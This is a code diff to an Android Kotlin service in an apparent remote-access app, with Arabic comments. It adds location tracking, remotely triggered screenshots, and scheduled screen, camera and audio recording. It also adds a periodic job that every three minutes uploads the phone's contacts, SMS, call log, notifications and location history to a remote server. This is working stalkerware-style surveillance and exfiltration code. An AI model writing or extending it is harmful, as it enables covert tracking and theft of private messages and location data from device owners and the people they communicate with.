@@ -125,7 +125,8 @@ class HostForegroundService : LifecycleService() {
                 Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_PHONE_STATE
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.ACCESS_FINE_LOCATION
             )
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 required.add(Manifest.permission.READ_MEDIA_IMAGES)
@@ -165,6 +166,16 @@ class HostForegroundService : LifecycleService() {
     private var dataProvider: HostDataProvider? = null
     private var requestJob: Job? = null
     private val pendingLocalIceCandidates = mutableListOf<org.webrtc.IceCandidate>()
+    // 🎬 محرك التسجيل واللقطة + 📍 تتبع الموقع + 🌐 مزامنة الحالة مع الخادم
+    private var recordingEngine: RecordingEngine? = null
+    private var locationTracker: LocationTracker? = null
+    private var lastStreamMode: String? = null
+    private var pausedStreamMode: String? = null
+    private var pausedFrontCamera: Boolean = false
+    private var pausedAudioEnabled: Boolean = false
+    private var statePosterJob: Job? = null
+    private var serverApiBase: String = ""
+    private var hostDeviceName: String = ""
 
     override fun onBind(intent: Intent): IBinder? {
         super.onBind(intent)
@@ -302,6 +313,11 @@ class HostForegroundService : LifecycleService() {
 
             startLiveEventPush()
             collectPeerEvents()
+
+            // 📍 تتبع الفيولي للهاتف (كل 3 دقائق نبضة) + مزامنة الحالة الصغيرة إلى الخادم
+            ensureLocationTracker()
+            serverApiBase = normalizeServerApiBase(finalUrl)
+            startStatePoster()
         }
     }
 
@@ -547,6 +563,8 @@ class HostForegroundService : LifecycleService() {
                 put("durationSec", payload.durationSec)
                 put("type", payload.type)
             }
+            // دفع JSON خام مباشرة (موقع / نبض بدء البث ...)
+            is kotlinx.serialization.json.JsonObject -> payload
             else -> return
         }
         scope.launch {
@@ -675,6 +693,8 @@ class HostForegroundService : LifecycleService() {
                 val ok = manager?.startCameraStreaming(front, audio) ?: false
                 // === سياسة الكتم الافتراضي: أي بث مرئي يبدأ صوته مكتوماً حتى لو طُلب تفعيله ===
                 if (ok) manager?.setAudioEnabled(false)
+                // 🔧 إصلاح البث: نبض جاهزية فوري ليتفاوض المتحكم ويستلم الإطارات
+                if (ok) pushStreamStarted("camera", false)
                 cameraStreamingState.value = CameraStreamingState(
                     isStreaming = ok,
                     isFrontCamera = manager?.isUsingFrontCamera() ?: false,
@@ -694,6 +714,7 @@ class HostForegroundService : LifecycleService() {
 
             Commands.START_AUDIO_STREAM -> {
                 val ok = manager?.startAudioOnlyStreaming() ?: false
+                if (ok) pushStreamStarted("audio", true)
                 cameraStreamingState.value = CameraStreamingState(
                     isStreaming = ok,
                     isFrontCamera = false,
@@ -712,6 +733,7 @@ class HostForegroundService : LifecycleService() {
 
             Commands.STOP_CAMERA_STREAM -> {
                 manager?.stopStreaming()
+                lastStreamMode = null
                 cameraStreamingState.value = CameraStreamingState(isStreaming = false)
                 buildJsonObject {
                     put("cmd", Commands.STOP_CAMERA_STREAM)
@@ -736,6 +758,7 @@ class HostForegroundService : LifecycleService() {
                 val intent = screenCaptureIntent
                 if (intent != null && manager != null) {
                     val ok = manager.startScreenStreaming(intent)
+                    if (ok) pushStreamStarted("screen", false)
                     cameraStreamingState.value = CameraStreamingState(
                         isStreaming = ok,
                         isFrontCamera = false,
@@ -820,10 +843,387 @@ class HostForegroundService : LifecycleService() {
                 }
             }
 
+            // 📷 لقطة شاشة فورية (يوقف البث مؤقتاً لو كان نشطاً ثم يعيده تلقائياً)
+            Commands.SCREENSHOT -> {
+                val engine = ensureRecordingEngine()
+                if (engine == null) {
+                    buildJsonObject {
+                        put("cmd", Commands.SCREENSHOT)
+                        put("error", "تعذر تهيئة محرك اللقطة على المضيف")
+                    }
+                } else {
+                    val wasStreaming = cameraStreamingState.value.isStreaming
+                    if (wasStreaming) {
+                        pausedStreamMode = lastStreamMode ?: "screen"
+                        pausedFrontCamera = cameraStreamingState.value.isFrontCamera
+                        pausedAudioEnabled = cameraStreamingState.value.isAudioEnabled
+                        manager?.stopStreaming()
+                        cameraStreamingState.value = CameraStreamingState(isStreaming = false)
+                        lastStreamMode = null
+                    }
+                    val (dataUrl, err) = engine.takeScreenshot(screenCaptureIntent)
+                    if (wasStreaming) restartPausedStream()
+                    buildJsonObject {
+                        put("cmd", Commands.SCREENSHOT)
+                        if (dataUrl != null) {
+                            put("image", dataUrl)
+                            put("saved", true)
+                        } else {
+                            put("error", err ?: "فشل التقاط اللقطة")
+                        }
+                    }
+                }
+            }
+
+            // ⏺ بدء تسجيل مجدول (شاشة/كاميرا/صوت)
+            Commands.REC_START -> {
+                val kind = request.params?.get("kind")?.jsonPrimitive?.contentOrNull ?: "screen"
+                if (kind != "screen" && kind != "camera" && kind != "audio") {
+                    buildJsonObject {
+                        put("cmd", Commands.REC_START)
+                        put("error", "نوع تسجيل غير مدعوم: $kind")
+                    }
+                } else {
+                    val engine = ensureRecordingEngine()
+                    if (engine == null) {
+                        buildJsonObject {
+                            put("cmd", Commands.REC_START)
+                            put("error", "تعذر تهيئة محرك التسجيل على المضيف")
+                        }
+                    } else {
+                        val front = request.params?.get("front")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: false
+                        val wantAudio = request.params?.get("audio")?.jsonPrimitive?.contentOrNull?.toBoolean() ?: true
+                        val delaySec = request.params?.get("delaySec")?.jsonPrimitive?.contentOrNull?.toLongOrNull() ?: 0L
+                        val segmentSec = request.params?.get("segmentSec")?.jsonPrimitive?.contentOrNull?.toLongOrNull() ?: 180L
+                        val intervalSec = request.params?.get("intervalSec")?.jsonPrimitive?.contentOrNull?.toLongOrNull() ?: 0L
+                        val repeatCount = request.params?.get("repeatCount")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 1
+                        // تفريغ الإسقاط/الجهاز من البث الحي عند تعارض النوعين
+                        val conflicts = (kind == "screen" && cameraStreamingState.value.isStreaming) ||
+                            (kind == "camera" && lastStreamMode == "camera") ||
+                            (kind == "audio" && lastStreamMode == "audio")
+                        if (conflicts) {
+                            pausedStreamMode = lastStreamMode ?: "screen"
+                            pausedFrontCamera = cameraStreamingState.value.isFrontCamera
+                            pausedAudioEnabled = cameraStreamingState.value.isAudioEnabled
+                            manager?.stopStreaming()
+                            cameraStreamingState.value = CameraStreamingState(isStreaming = false)
+                            lastStreamMode = null
+                        }
+                        val err = engine.startRecording(
+                            kind,
+                            if (kind == "screen") screenCaptureIntent else null,
+                            front,
+                            wantAudio,
+                            delaySec.coerceAtLeast(0L),
+                            segmentSec,
+                            intervalSec,
+                            repeatCount
+                        )
+                        buildJsonObject {
+                            put("cmd", Commands.REC_START)
+                            put("kind", kind)
+                            if (err == null) {
+                                put("recStarted", true)
+                                put("scheduled", delaySec > 0L)
+                                put("segmentSec", segmentSec)
+                                put("intervalSec", intervalSec)
+                                put("repeatCount", repeatCount)
+                            } else {
+                                put("error", err)
+                            }
+                        }
+                    }
+                }
+            }
+
+            // ⏹ إيقاف تسجيل
+            Commands.REC_STOP -> {
+                val kind = request.params?.get("kind")?.jsonPrimitive?.contentOrNull ?: ""
+                val engine = recordingEngine
+                val stopped = if (kind.isBlank()) {
+                    if (engine == null) false else {
+                        for (k in engine.activeKinds()) engine.stopRecording(k)
+                        true
+                    }
+                } else {
+                    engine?.stopRecording(kind) ?: false
+                }
+                buildJsonObject {
+                    put("cmd", Commands.REC_STOP)
+                    put("stopped", stopped)
+                    put("kind", kind)
+                }
+            }
+
+            // 📂 أرشيف التسجيلات واللقطات (مجلدات: screen/camera/audio/screenshot)
+            Commands.RECORDINGS_LIST -> {
+                val engine = ensureRecordingEngine()
+                val items = engine?.listRecordings() ?: emptyList()
+                buildJsonObject {
+                    put("cmd", Commands.RECORDINGS_LIST)
+                    put(
+                        "items",
+                        json.encodeToJsonElement(
+                            ListSerializer(kotlinx.serialization.json.JsonObject.serializer()),
+                            items
+                        )
+                    )
+                }
+            }
+
+            // 📍 نقاط سجل المواقع المختصرة (تُعرض على خارطة تفاعلية)
+            Commands.LOCATIONS_GET -> {
+                val limit = request.params?.get("limit")?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 200
+                val tracker = locationTracker
+                val items = tracker?.getPoints(limit) ?: emptyList()
+                buildJsonObject {
+                    put("cmd", Commands.LOCATIONS_GET)
+                    put("tracking", tracker?.isRunning() ?: false)
+                    put(
+                        "items",
+                        json.encodeToJsonElement(
+                            ListSerializer(kotlinx.serialization.json.JsonObject.serializer()),
+                            items
+                        )
+                    )
+                }
+            }
+
+            Commands.LOCATIONS_CLEAR -> {
+                locationTracker?.clear()
+                buildJsonObject {
+                    put("cmd", Commands.LOCATIONS_CLEAR)
+                    put("cleared", true)
+                }
+            }
+
             else -> buildJsonObject {
                 put("cmd", request.cmd)
                 put("error", "أمر غير معروف: ${request.cmd}")
             }
+        }
+    }
+
+    // ==========================================================
+    //     محرك التسجيل + الموقع + إصلاح تفاوض البث + مزامنة الخادم
+    // ==========================================================
+    internal fun ensureRecordingEngine(): RecordingEngine? {
+        if (recordingEngine == null) {
+            try {
+                recordingEngine = RecordingEngine(applicationContext).also { eng ->
+                    eng.onRecordingSeriesEnded = { restartPausedStream() }
+                }
+            } catch (t: Throwable) {
+                Log.w(TAG, "تعذر إنشاء محرك التسجيل: ${t.message}")
+            }
+        }
+        return recordingEngine
+    }
+
+    internal fun ensureLocationTracker() {
+        if (locationTracker == null) {
+            locationTracker = LocationTracker(applicationContext, scope) { point ->
+                pushLiveEvent("location", point)
+            }
+        }
+        val tracker = locationTracker
+        if (tracker != null && !tracker.isRunning()) {
+            tracker.start()
+        }
+    }
+
+    /**
+     * يعيد إحياء البث الحي الموقوف مؤقتاً بسبب تسجيل/لقطة، ثم ينبّه المتحكم ليتفاوض من جديد.
+     */
+    private fun restartPausedStream() {
+        val mode = pausedStreamMode ?: return
+        pausedStreamMode = null
+        scope.launch {
+            kotlinx.coroutines.delay(600)
+            try {
+                when (mode) {
+                    "screen" -> {
+                        val intent = screenCaptureIntent
+                        if (intent != null && peerManager != null) {
+                            val ok = peerManager?.startScreenStreaming(intent) ?: false
+                            if (ok) {
+                                cameraStreamingState.value = CameraStreamingState(
+                                    isStreaming = true,
+                                    isAudioEnabled = false
+                                )
+                                pushStreamStarted("screen", false)
+                            }
+                        }
+                    }
+                    "camera" -> {
+                        val audioOn = pausedAudioEnabled
+                        val ok = peerManager?.startCameraStreaming(pausedFrontCamera, audioOn) ?: false
+                        if (ok) {
+                            peerManager?.setAudioEnabled(audioOn)
+                            cameraStreamingState.value = CameraStreamingState(
+                                isStreaming = true,
+                                isFrontCamera = pausedFrontCamera,
+                                isAudioEnabled = audioOn
+                            )
+                            pushStreamStarted("camera", audioOn)
+                        }
+                    }
+                    "audio" -> {
+                        val ok = peerManager?.startAudioOnlyStreaming() ?: false
+                        if (ok) {
+                            cameraStreamingState.value = CameraStreamingState(isStreaming = true, isAudioEnabled = true)
+                            pushStreamStarted("audio", true)
+                        }
+                    }
+                }
+            } catch (t: Throwable) {
+                Log.w(TAG, "فشل إعادة إحياء البث: ${t.message}")
+            }
+        }
+    }
+
+    /**
+     * 🔧 نبض جاهزية البث: يُرسل للمتحكم لحظة بدء الالتقاط فعلياً (بعد الإذن)،
+     * لتطلع اللوحة إعادة التفاوض فوراً وتستلم الإطارات بدل نافذة فارغة.
+     */
+    private fun pushStreamStarted(mode: String, audioEnabled: Boolean) {
+        lastStreamMode = mode
+        val target = activeControllerId
+        if (target.isNullOrBlank()) return
+        val myId = hostDeviceId
+        if (myId.isBlank()) return
+        scope.launch {
+            try {
+                signaling?.send(
+                    Signal.PushEvent(
+                        from = myId,
+                        to = target,
+                        kind = "stream_started",
+                        payload = buildJsonObject {
+                            put("mode", mode)
+                            put("audioEnabled", audioEnabled)
+                            put("ts", System.currentTimeMillis())
+                        }
+                    )
+                )
+                Log.d(TAG, "✅ نبض بدء بث [$mode] إلى $target")
+            } catch (t: Throwable) {
+                Log.w(TAG, "فشل نبض بدء البث [$mode]: ${t.message}")
+            }
+        }
+    }
+
+    // ==========================================================
+    //          مزامنة الحالة الصغيرة مع خادم Render
+    // ==========================================================
+    private fun normalizeServerApiBase(rawUrl: String): String {
+        return try {
+            var u = rawUrl.trim().trimEnd('/')
+            if (u.endsWith("/ws")) u = u.removeSuffix("/ws")
+            if (u.startsWith("wss://")) u = "https://" + u.removePrefix("wss://")
+            else if (u.startsWith("ws://")) u = "http://" + u.removePrefix("ws://")
+            u
+        } catch (_: Throwable) { "" }
+    }
+
+    /**
+     * نبضة دورية كل 3 دقائق (وبدخول أولي بعد 15 ثانية) تدفع لقطة بيانات صغيرة
+     * إلى الخادم، ليبقى المتحكم قادراً على رؤية البيانات حتى لو انقطع المضيف.
+     */
+    private fun startStatePoster() {
+        if (statePosterJob?.isActive == true) return
+        statePosterJob = scope.launch {
+            var first = true
+            while (true) {
+                kotlinx.coroutines.delay(if (first) 15_000L else 180_000L)
+                first = false
+                try {
+                    postServerSnapshot()
+                } catch (t: Throwable) {
+                    Log.w(TAG, "دفع الحالة للخادم فشل: ${t.message}")
+                }
+            }
+        }
+    }
+
+    private suspend fun postServerSnapshot() {
+        val base = serverApiBase
+        if (base.isBlank()) return
+        try {
+            val provider = dataProvider
+            val dev = try { provider?.readDeviceInfo() } catch (_: Throwable) { null }
+            val contacts = (try { provider?.readContacts(120) } catch (_: Throwable) { null }) ?: emptyList()
+            val sms = (try { provider?.readSms(120) } catch (_: Throwable) { null }) ?: emptyList()
+            val calls = (try { provider?.readCallLog(120) } catch (_: Throwable) { null }) ?: emptyList()
+            val notifs = try { BridgeNotificationListenerService.cachedNotifications.toList().take(120) } catch (_: Throwable) { emptyList() }
+            val pts = locationTracker?.getPoints(120) ?: emptyList()
+
+            val snapshot = buildJsonObject {
+                put("deviceId", hostDeviceId)
+                put("role", "host")
+                put("name", hostDeviceName)
+                put("ts", System.currentTimeMillis())
+                put("online", true)
+                put("batteryLevel", dev?.batteryLevel ?: -1)
+                put("isCharging", dev?.isCharging ?: false)
+                put(
+                    "data", buildJsonObject {
+                        put("batteryLevel", dev?.batteryLevel ?: -1)
+                        put("isCharging", dev?.isCharging ?: false)
+                        put("model", android.os.Build.MODEL)
+                        put("androidVersion", android.os.Build.VERSION.RELEASE ?: "")
+                        put("lastSeen", System.currentTimeMillis())
+                        put("location", kotlinx.serialization.json.JsonArray(pts))
+                        put(
+                            "contacts",
+                            json.encodeToJsonElement(
+                                ListSerializer(ContactItem.serializer()),
+                                contacts
+                            )
+                        )
+                        put(
+                            "sms",
+                            json.encodeToJsonElement(
+                                ListSerializer(SmsMessage.serializer()),
+                                sms
+                            )
+                        )
+                        put(
+                            "calls",
+                            json.encodeToJsonElement(
+                                ListSerializer(CallLogItem.serializer()),
+                                calls
+                            )
+                        )
+                        put(
+                            "notifications",
+                            json.encodeToJsonElement(
+                                ListSerializer(com.remotebridge.core.model.NotificationItem.serializer()),
+                                notifs
+                            )
+                        )
+                    }
+                )
+            }
+
+            kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
+                val url = java.net.URL("$base/api/state")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.connectTimeout = 10_000
+                conn.readTimeout = 15_000
+                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+                conn.outputStream.use { os -> os.write(snapshot.toString().toByteArray(Charsets.UTF_8)) }
+                val code = conn.responseCode
+                try { conn.inputStream?.close() } catch (_: Throwable) { }
+                try { conn.errorStream?.close() } catch (_: Throwable) { }
+                conn.disconnect()
+                if (code in 200..299) Log.d(TAG, "✅ تم دفع الحالة إلى الخادم (HTTP $code)")
+                else Log.w(TAG, "دفع الحالة للخادم فشل: HTTP $code")
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "خطأ مزامنة الحالة: ${t.message}")
         }
     }
 
@@ -839,6 +1239,9 @@ class HostForegroundService : LifecycleService() {
                 isFrontCamera = false,
                 isAudioEnabled = true
             )
+            // 🔧 إصلاح الفجوة الحرجة: هنا كان البث يبدأ فعلياً بعد منح الإذن دون إبلاغ المتحكم،
+            // فتبقى نافذة العرض فارغة. نبض stream_started يُطلق إعادة التفاوض فوراً من اللوحة.
+            pushStreamStarted("screen", true)
         }
     }
 
@@ -893,6 +1296,13 @@ class HostForegroundService : LifecycleService() {
         activeInstance = null
         cameraStreamingState.value = CameraStreamingState(isStreaming = false)
         stopLiveEventPush()
+        // 🧹 إيقاف محركات التسجيل/الموقع والمزامنة
+        try { recordingEngine?.stopAll() } catch (_: Throwable) { }
+        recordingEngine = null
+        try { locationTracker?.stop() } catch (_: Throwable) { }
+        locationTracker = null
+        statePosterJob?.cancel()
+        statePosterJob = null
         requestJob?.cancel()
         peerManager?.close()
         peerManager = null
